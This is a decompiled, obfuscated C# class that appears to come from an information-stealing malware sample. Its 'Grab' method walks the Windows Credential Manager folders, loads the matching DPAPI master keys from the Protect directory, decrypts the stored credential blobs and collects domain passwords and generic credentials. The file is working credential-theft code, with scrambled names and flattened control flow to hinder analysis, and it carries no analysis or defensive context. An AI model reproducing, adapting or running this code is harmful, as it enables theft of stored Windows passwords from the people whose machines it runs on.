using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.CompilerServices;
using NbuLaJKWyx2;
using SNt;
using p3N5Y;

namespace ZAZUx;

public class rh8D3HbCw : MnVCfk
{
	[CompilerGenerated]
	private string Application__BackingField;

	public string X5IqZgtrY1
	{
		[CompilerGenerated]
		get
		{
			return Application__BackingField;
		}
		[CompilerGenerated]
		set
		{
			Application__BackingField = value;
		}
	}

	public List<ii68> Grab()
	{
		int num = 0;
		List<ii68> list = default;
		do
		{
			if (num == 3)
			{
				list.AddRange(cOoY(iI6anJ2Z._8Zyn2YXtHnZ.Generic));
				num = 4;
			}
			if (num == 1)
			{
				list = new List<ii68>();
				num = 2;
			}
			if (num == 2)
			{
				list.AddRange(cOoY(iI6anJ2Z._8Zyn2YXtHnZ.DomainPassword));
				num = 3;
			}
			if (num == 0)
			{
				num = 1;
			}
		}
		while (num != 4);
		return list;
	}

	private List<ii68> cOoY(iI6anJ2Z._8Zyn2YXtHnZ WGphZc)
	{
		int num = 0;
		List<string> list = default;
		List<ii68> list2 = default;
		List<string>.Enumerator enumerator = default;
		do
		{
			if (num == 4)
			{
				list.AddRange(Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Credentials\\"));
				num = 5;
			}
			if (num == 2)
			{
				list2 = new List<ii68>();
				num = 3;
			}
			if (num == 7)
			{
				goto IL_007e;
			}
			goto IL_0094;
			IL_012b:
			if (num == 3)
			{
				if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Credentials\\"))
				{
					goto IL_0104;
				}
				num = 4;
			}
			if (num == 0)
			{
				num = 1;
			}
			continue;
			IL_0094:
			if (num == 6)
			{
				list.AddRange(Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Credentials\\"));
				num = 7;
			}
			if (num == 1)
			{
				list = new List<string>();
				num = 2;
			}
			if (num == 5)
			{
				goto IL_0104;
			}
			goto IL_012b;
			IL_007e:
			enumerator = list.GetEnumerator();
			num = 8;
			goto IL_0094;
			IL_0104:
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Credentials\\"))
			{
				goto IL_007e;
			}
			num = 6;
			goto IL_012b;
		}
		while (num != 8);
		try
		{
			while (enumerator.MoveNext())
			{
				string current = enumerator.Current;
				UmiqCcKeV.gtA3WUh gtA3WUh = UmiqCcKeV.IseaEIxFUgz(current);
				string[] directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Protect\\");
				string[] array = directories;
				foreach (string text in array)
				{
					string path = text + "\\" + gtA3WUh.hRvcrS4iBww;
					if (!File.Exists(path))
					{
						continue;
					}
					try
					{
						byte[] epME = UmiqCcKeV._7Jmp0T3phv3("", Directory.GetParent(path).FullName);
						Dictionary<string, string> dbBjpJ = UmiqCcKeV._4PJrD(File.ReadAllBytes(path), epME);
						byte[] xgaI = UmiqCcKeV.kY0J4(File.ReadAllBytes(current), dbBjpJ);
						ii68 ii69 = UmiqCcKeV.a2E(xgaI, WGphZc);
						if (ii69 != null)
						{
							list2.Add(ii69);
						}
					}
					catch
					{
					}
				}
			}
			return list2;
		}
		finally
		{
			((IDisposable)enumerator/*cast due to constrained. prefix*/).Dispose();
		}
	}
}
